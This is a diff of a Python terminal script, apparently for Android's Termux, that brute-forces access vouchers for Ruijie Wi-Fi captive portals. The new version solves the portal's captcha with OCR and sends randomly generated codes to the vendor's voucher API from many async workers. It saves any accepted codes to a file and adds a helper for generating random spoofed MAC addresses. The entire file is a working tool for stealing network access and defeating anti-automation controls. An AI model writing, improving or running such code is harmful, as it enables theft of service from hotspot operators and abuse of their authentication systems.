@@ -7,9 +7,12 @@ import string
 import sys
 import time
 import httpx
+import cv2
+import ddddocr
+import numpy as np
 
 # ====================================================
-# 🌟 RUIJIE ELITE SUITE v5.6 [LIVE CODE STREAM MONITOR]
+# 🌟 RUIJIE ELITE SUITE [TERMUX STANDALONE v8.0]
 # ====================================================
 
 C_CYAN = "\033[96m"
@@ -26,144 +29,164 @@ def clear_screen():
 
 def banner():
     print(f"{C_CYAN}{C_BOLD}╔══════════════════════════════════════════════════╗{C_RESET}")
-    print(f"{C_CYAN}{C_BOLD}║{C_MAGENTA}          ⚡ RUIJIE ELITE SUITE v5.6 ⚡           {C_CYAN}{C_BOLD}║{C_RESET}")
-    print(f"{C_CYAN}{C_BOLD}║{C_YELLOW}        [ Live Code Stream & Health Engine ]      {C_CYAN}{C_BOLD}║{C_RESET}")
+    print(f"{C_CYAN}{C_BOLD}║{C_MAGENTA}          ⚡ RUIJIE ELITE SUITE v8.0 ⚡           {C_CYAN}{C_BOLD}║{C_RESET}")
+    print(f"{C_CYAN}{C_BOLD}║{C_YELLOW}        [ Termux Standalone Wifidog Engine ]      {C_CYAN}{C_BOLD}║{C_RESET}")
     print(f"{C_CYAN}{C_BOLD}╚══════════════════════════════════════════════════╝{C_RESET}")
 
-def check_url_health(url):
-    try:
-        print(f"{C_YELLOW}⚙️ Checking URL status...{C_RESET}")
-        response = httpx.get(url, timeout=4.0, follow_redirects=True)
-        if response.status_code < 500:
-            return True
-    except Exception:
-        pass
-    return False
+# --- OCR & Captcha Helpers ---
+_ocr = None
+def get_ocr():
+    global _ocr
+    if _ocr is None:
+        try:
+            _ocr = ddddocr.DdddOcr(show_ad=False)
+        except:
+            _ocr = None
+    return _ocr
 
-def test_code(url, code):
-    target_url = f"{url}/portal?code={code}"
+def _ocr_sync(image_bytes):
+    ocr = get_ocr()
+    if ocr is None:
+        return None
     try:
-        response = httpx.get(target_url, timeout=2.0, follow_redirects=True)
-        if response.status_code == 200 and "success" in response.text.lower():
-            return code
+        nparr = np.frombuffer(image_bytes, np.uint8)
+        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
+        if img is None:
+            return None
+        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
+        blur = cv2.GaussianBlur(gray, (3, 3), 0)
+        _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
+        _, buffer = cv2.imencode('.png', thresh)
+        return ocr.classification(buffer.tobytes()).upper()
+    except:
+        return None
+
+def get_mac():
+    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
+    return ':'.join(f'{x:02x}' for x in [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)])
+
+def replace_mac(url, new_mac):
+    return import_re.sub(r'(?<=mac=)[^&]+', new_mac, url) if 'mac=' in url else url
+
+import re as import_re
+
+async def get_session_id(client, session_url):
+    try:
+        if 'sessionId=' in session_url:
+            match = import_re.search(r'[?&]sessionId=([a-zA-Z0-9]+)', session_url)
+            if match:
+                return match.group(1)
+        resp = await client.get(session_url, follow_redirects=True, timeout=10.0)
+        final_url = str(resp.url)
+        match = import_re.search(r'[?&]sessionId=([a-zA-Z0-9]+)', final_url)
+        if match:
+            return match.group(1)
+        text = resp.text
+        html_match = import_re.search(r"sessionId['\"]?\s*[:=]\s*['\"]([a-zA-Z0-9]+)['\"]", text)
+        if html_match:
+            return html_match.group(1)
     except Exception:
         pass
     return None
 
-def save_code(code, url_tag):
+async def verify_and_check(session_url, code):
+    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
+    headers = {
+        'authority': 'portal-as.ruijienetworks.com',
+        'accept': '*/*',
+        'content-type': 'application/json',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+    }
+    try:
+        async with httpx.AsyncClient(timeout=10.0, follow_redirects=True) as client:
+            session_id = await get_session_id(client, session_url)
+            if not session_id:
+                return False
+            
+            # Fetch Captcha
+            cap_url = f"https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId={session_id}&_t={time.time()}"
+            cap_resp = await client.get(cap_url)
+            if cap_resp.status_code != 200:
+                return False
+            
+            auth_text = await asyncio.to_thread(_ocr_sync, cap_resp.content)
+            if not auth_text:
+                return False
+            
+            # Verify Captcha
+            verify_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/verify"
+            v_resp = await client.post(verify_url, json={'sessionId': session_id, 'authCode': auth_text})
+            if v_resp.status_code != 200 or not v_resp.json().get("success"):
+                return False
+            
+            # Post Voucher Code
+            payload = {
+                "accessCode": code,
+                "sessionId": session_id,
+                "apiVersion": 1,
+                "authCode": auth_text
+            }
+            resp = await client.post(post_url, json=payload, headers=headers)
+            res_text = resp.text
+            if 'logonUrl' in res_text or 'success' in res_text.lower():
+                return True
+    except Exception:
+        pass
+    return False
+
+def save_code(code):
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     with open("valid_codes.txt", "a") as f:
-        f.write(f"[{timestamp}] [{url_tag}] CODE: {code}\n")
+        f.write(f"[{timestamp}] CODE: {code}\n")
 
-# ----------------------------------------------------
-# 📂 Sub-Menu: Dual URL Setup & Live Stream Scanner
-# ----------------------------------------------------
-def multi_url_scanner_menu():
-    global portal_url_1, portal_url_2
-    if 'portal_url_1' not in globals():
-        portal_url_1 = ""
-    if 'portal_url_2' not in globals():
-        portal_url_2 = ""
+import asyncio
 
-    while True:
-        clear_screen()
-        banner()
-        print(f"{C_WHITE}┌──────────────────────────────────────────────────┐{C_RESET}")
-        print(f"{C_WHITE}│{C_CYAN}  [1] 🌐 Setup & Test Portal URLs                 {C_WHITE}│{C_RESET}")
-        print(f"{C_WHITE}│{C_CYAN}  [2] 🚀 Start Live Stream Random Scanner         {C_WHITE}│{C_RESET}")
-        print(f"{C_WHITE}│{C_CYAN}  [3] 🔙 Back to Main Menu                        {C_WHITE}│{C_RESET}")
-        print(f"{C_WHITE}└──────────────────────────────────────────────────┘{C_RESET}")
-        
-        sub_choice = input(f"{C_MAGENTA}{C_BOLD} ⚡ Select Sub-Option [1-3] ➔ {C_WHITE}").strip()
-        
-        if sub_choice == '1':
-            print(f"\n{C_CYAN}⚙️ Portal URL Configuration & Health Check:{C_RESET}")
-            temp_url1 = input(f"{C_YELLOW} ┣ 🌐 Enter Primary URL (URL ၁) ➔ {C_WHITE}").strip()
+def terminal_scanner():
+    print(f"\n{C_MAGENTA}╔══════════════════════════════════════════════════╗{C_RESET}")
+    print(f"{C_MAGENTA}║         🔥 TERMUX HIGH-SPEED VOUCHER SCANNER     ║{C_RESET}")
+    print(f"{C_MAGENTA}╚══════════════════════════════════════════════════╝{C_RESET}")
+    
+    portal_url = input(f"{C_YELLOW} ┣ 🌐 Enter Portal URL ➔ {C_WHITE}").strip()
+    if not portal_url:
+        print(f"{C_RED} ┗ ❌ [Error] Portal URL cannot be empty!{C_RESET}")
+        return
+
+    length_str = input(f"{C_YELLOW} ┗ 📏 ကုတ်အရှည် (Length, ဥပမာ - 6) ➔ {C_WHITE}").strip()
+    length = int(length_str) if length_str.isdigit() else 6
+
+    print(f"\n{C_GREEN}🚀 [Scanner Active] Length: {length} | Async Wifidog Engine{C_RESET}\n")
+    print(f"{C_CYAN}--------------------------------------------------{C_RESET}")
+    
+    chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
+    found_count = 0
+    scanned_count = 0
+    start_time = time.time()
+
+    async def async_worker():
+        nonlocal scanned_count, found_count
+        while True:
+            code = ''.join(random.choices(chars, k=length))
+            scanned_count += 1
             
-            if temp_url1:
-                if check_url_health(temp_url1):
-                    portal_url_1 = temp_url1
-                    print(f"{C_GREEN} ✅ [URL-1] Status: ONLINE & WORKING!{C_RESET}")
-                else:
-                    print(f"{C_RED} ❌ [URL-1] Status: OFFLINE or UNREACHABLE!{C_RESET}")
-            
-            temp_url2 = input(f"{C_YELLOW} ┗ 🌐 Enter Secondary URL (URL ၂) [Optional] ➔ {C_WHITE}").strip()
-            if temp_url2:
-                if check_url_health(temp_url2):
-                    portal_url_2 = temp_url2
-                    print(f"{C_GREEN} ✅ [URL-2] Status: ONLINE & WORKING!{C_RESET}")
-                else:
-                    print(f"{C_RED} ❌ [URL-2] Status: OFFLINE or UNREACHABLE!{C_RESET}")
-            else:
-                portal_url_2 = ""
+            elapsed = time.time() - start_time
+            speed = scanned_count / elapsed if elapsed > 0 else 0
+            sys.stdout.write(f"\r{C_CYAN}[Checking: {code}] | Speed: {speed:.1f} req/s | Found: {found_count}{C_RESET}   ")
+            sys.stdout.flush()
 
-            input(f"\n{C_CYAN}Press Enter to continue...{C_RESET}")
-            
-        elif sub_choice == '2':
-            if not portal_url_1 or not check_url_health(portal_url_1):
-                print(f"\n{C_RED}❌ [Error] Valid Primary URL is required! Please setup in Option [1].{C_RESET}")
-                input(f"\n{C_CYAN}Press Enter to continue...{C_RESET}")
-                continue
-                
-            length_str = input(f"{C_YELLOW} ┗ 📏 ကုတ်အရှည် (Length, ဥပမာ - 6) ➔ {C_WHITE}").strip()
-            length = int(length_str) if length_str.isdigit() else 6
+            is_valid = await verify_and_check(portal_url, code)
+            if is_valid:
+                print(f"\n\n{C_GREEN}{C_BOLD}✨ [BINGO! VALID CODE FOUND] ➔ {code}{C_RESET}")
+                save_code(code)
+                found_count += 1
 
-            print(f"\n{C_GREEN}🚀 [Live Stream Active] Length: {length} | Multi-Threaded Engine{C_RESET}\n")
-            print(f"{C_CYAN}--------------------------------------------------{C_RESET}")
-            
-            chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
-            found_count = 0
-            scanned_count = 0
-            max_workers = 35
-            start_time = time.time()
+    async def main_loop():
+        tasks = [asyncio.create_task(async_worker()) for _ in range(15)]
+        await asyncio.gather(*tasks)
 
-            def worker(_):
-                nonlocal scanned_count
-                code = ''.join(random.choices(chars, k=length))
-                scanned_count += 1
-                
-                # လက်တလော စစ်ဆေးနေသော ကုဒ်နှင့် တစ်စက္ကန့်ချင်းအမြန်နှုန်း (RPS) ကို Live ပြသရန်
-                elapsed = time.time() - start_time
-                speed = scanned_count / elapsed if elapsed > 0 else 0
-                sys.stdout.write(f"\r{C_CYAN}[Checking Code: {C_BOLD}{code}{C_RESET}{C_CYAN}] | Speed: {speed:.1f} req/s | Found: {found_count}{C_RESET}   ")
-                sys.stdout.flush()
-
-                # Test on URL 1
-                res1 = test_code(portal_url_1, code)
-                if res1:
-                    return res1, "URL-1"
-                
-                # Test on URL 2 (if provided)
-                if portal_url_2:
-                    res2 = test_code(portal_url_2, code)
-                    if res2:
-                        return res2, "URL-2"
-                return None
-
-            try:
-                with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
-                    futures = [executor.submit(worker, i) for i in range(5000)]
-                    
-                    for future in concurrent.futures.as_completed(futures):
-                        res = future.result()
-                        if res:
-                            result_code, tag = res
-                            print(f"\n\n{C_GREEN}{C_BOLD}✨ [BINGO! FOUND on {tag}] ➔ {result_code}{C_RESET}")
-                            save_code(result_code, tag)
-                            found_count += 1
-            except KeyboardInterrupt:
-                print(f"\n\n{C_RED}⚠️ [Warning] Scan stopped by user.{C_RESET}")
-
-            elapsed_time = time.time() - start_time
-            print(f"\n\n{C_YELLOW}🏁 [Summary] Time: {elapsed_time:.2f}s | Scanned: {scanned_count} | Found: {found_count}{C_RESET}")
-            print(f"{C_GREEN}💾 Saved to 'valid_codes.txt'.{C_RESET}")
-            input(f"\n{C_CYAN}Press Enter to return...{C_RESET}")
-            
-        elif sub_choice == '3':
-            break
-        else:
-            print(f"\n{C_RED}❌ [Error] Invalid option!{C_RESET}")
-            input(f"\n{C_CYAN}Press Enter to continue...{C_RESET}")
+    try:
+        asyncio.run(main_loop())
+    except KeyboardInterrupt:
+        print(f"\n\n{C_RED}⚠️ [Warning] Scan stopped by user.{C_RESET}")
 
 def system_boost_and_exit():
     print(f"\n{C_YELLOW}⚙️ [Boosting System] Cleaning up RAM and cache...{C_RESET}")
@@ -174,27 +197,25 @@ def system_boost_and_exit():
         pass
     time.sleep(0.5)
     print(f"{C_GREEN}✨ [Success] System optimized and memory freed!{C_RESET}")
-    print(f"{C_MAGENTA}👋 Shutting down Elite Suite. Stay secure!{C_RESET}")
+    print(f"{C_MAGENTA}👋 Shutting down Suite. Stay secure!{C_RESET}")
     sys.exit(0)
 
-# ----------------------------------------------------
-# 🏠 Main Menu
-# ----------------------------------------------------
 def main_menu():
     while True:
         clear_screen()
         banner()
         print(f"{C_WHITE}┌──────────────────────────────────────────────────┐{C_RESET}")
-        print(f"{C_WHITE}│{C_CYAN}  [1] ⚙️ Setup & Launch Scanner (Dual URL & Check) {C_WHITE}│{C_RESET}")
+        print(f"{C_WHITE}│{C_CYAN}  [1] ⚡ Start Standalone Voucher Scanner         {C_WHITE}│{C_RESET}")
         print(f"{C_WHITE}│{C_CYAN}  [2] 📂 View Saved Valid Codes Archive           {C_WHITE}│{C_RESET}")
         print(f"{C_WHITE}│{C_CYAN}  [3] 🧹 Clear Saved Codes History                {C_WHITE}│{C_RESET}")
         print(f"{C_WHITE}│{C_CYAN}  [4] 🚀 Exit & System Boost (Memory Clean)       {C_WHITE}│{C_RESET}")
         print(f"{C_WHITE}└──────────────────────────────────────────────────┘{C_RESET}")
         
-        choice = input(f"{C_MAGENTA}{C_BOLD} ⚡ Select Main Option [1-4] ➔ {C_WHITE}").strip()
+        choice = input(f"{C_MAGENTA}{C_BOLD} ⚡ Select Option [1-4] ➔ {C_WHITE}").strip()
         
         if choice == '1':
-            multi_url_scanner_menu()
+            terminal_scanner()
+            input(f"\n{C_CYAN}Press Enter to return...{C_RESET}")
         elif choice == '2':
             try:
                 with open("valid_codes.txt", "r") as f:
@@ -204,7 +225,7 @@ def main_menu():
                     print(f"{C_WHITE}{f.read()}{C_RESET}")
             except FileNotFoundError:
                 print(f"\n{C_YELLOW}📂 [Info] Archive is currently empty.{C_RESET}")
-            input(f"\n{C_CYAN}Press Enter to return to main menu...{C_RESET}")
+            input(f"\n{C_CYAN}Press Enter to return...{C_RESET}")
         elif choice == '3':
             try:
                 open("valid_codes.txt", "w").close()
@@ -215,7 +236,7 @@ def main_menu():
         elif choice == '4':
             system_boost_and_exit()
         else:
-            print(f"\n{C_RED}❌ [Error] Invalid option selected!{C_RESET}")
+            print(f"\n{C_RED}❌ [Error] Invalid option!{C_RESET}")
             input(f"\n{C_CYAN}Press Enter to continue...{C_RESET}")
 
 if __name__ == "__main__":
